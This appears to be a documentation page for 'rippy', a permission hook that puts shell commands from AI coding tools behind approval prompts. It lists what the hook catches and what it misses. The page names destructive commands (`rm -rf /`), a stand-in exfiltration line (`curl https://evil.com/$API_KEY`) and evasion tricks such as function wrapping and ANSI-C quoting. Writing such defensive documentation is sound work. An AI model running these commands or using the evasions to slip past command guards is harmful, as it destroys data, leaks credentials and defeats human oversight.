---
title: Safety model
description: What rippy protects against, what it doesn't, and why the defaults are conservative.
---

rippy is a **permission system**, not a sandbox. It adds friction in front
of dangerous commands — it does not isolate processes, restrict network
access, or contain the effects of a command once it runs. Think of it as a
seatbelt, not a roll cage: a cheap, high-value layer of a larger
defense-in-depth strategy.

## What rippy protects against

- **Auto-execution of classically destructive commands.** `rm -rf /`, `dd`,
  `chmod 777`, and friends are blocked or forced through an approval prompt.
- **Unsafe subcommand usage.** `git push --force`, `docker run`,
  `kubectl delete` require approval even when their read-only siblings
  (`git status`, `docker ps`, `kubectl get`) are auto-approved.
- **File overwrites to sensitive paths.** Redirect rules catch writes to
  `**/.env*`, `**/*.pem`, `/etc/*`, and anywhere else you list.
- **Blind script execution.** When the command is `python script.py`,
  `bash script.sh`, `psql -f query.sql`, or similar, rippy reads the file
  and [analyzes its contents](/reference/file-analysis/) before deciding.
- **Unknown commands.** Anything not in the built-in safe allowlist or
  handled by a specific handler defaults to **ask** — a human stays in
  the loop.

## What rippy does NOT protect against

| Limitation | Impact | How rippy handles it |
|---|---|---|
| **Variables are not evaluated** | `rm $VAR` is analyzed without knowing `$VAR`'s value | rippy asks conservatively whenever it sees a variable expansion |
| **Shell aliases are invisible** | Aliases from `.bashrc` / `.zshrc` bypass analysis | Only rippy-config-defined aliases are resolved |
| **Quote handling is structural** | ANSI-C quoting (`$'\x72\x6d'`) is not normalized | Standard quoting works; exotic forms may pass through unrecognized |
| **File analysis is heuristic** | `import os as system` in Python is not caught | Dangerous patterns trigger **ask**, never silent **allow** |
| **Credential exfiltration** | `curl https://evil.com/$API_KEY` uses a legitimate command | rippy is command-aware, not data-aware — use network egress controls |
| **Function definitions** | `f() { rm -rf /; }; f` — function bodies are not analyzed | Function definitions conservatively trigger **ask** |

## Fail-safe defaults

Every grey-area case in rippy's decision tree resolves to **ask**, never
**allow**. That includes:

- Unknown commands.
- Variable expansions the parser cannot fully resolve.
- Exotic shell constructs (function definitions, unusual quoting,
  command-substitution sources rippy doesn't model).
- File-analysis results where a dangerous pattern is present but rippy
  cannot prove the script is safe.

If rippy itself crashes or hits an internal error it **fails open** with
exit code `1` so that your AI tool doesn't lock up on a bug in the hook.
That's a deliberate tradeoff — rippy's job is to add friction, not to
become a single point of failure for your workflow. If you want
fail-closed behavior, wrap the hook in a script that translates exit
code `1` into `2`.

## Trust model for project configs

Project-level `.rippy.toml` (or legacy `.rippy` / `.dippy`) files could
theoretically weaken protections if loaded from a cloned repo
unconditionally. rippy mitigates this with an explicit trust step — see
[Configuration overview → Project config trust](/configuration/overview/#project-config-trust).

## In summary

rippy prevents **accidental damage** from AI-generated commands by
requiring explicit approval for anything dangerous. It's most effective as
part of a larger strategy that also includes branch protection, secret
detection, and network egress controls. The goal isn't to make every
possible attack impossible — it's to make the common, accidental mistakes
significantly harder.
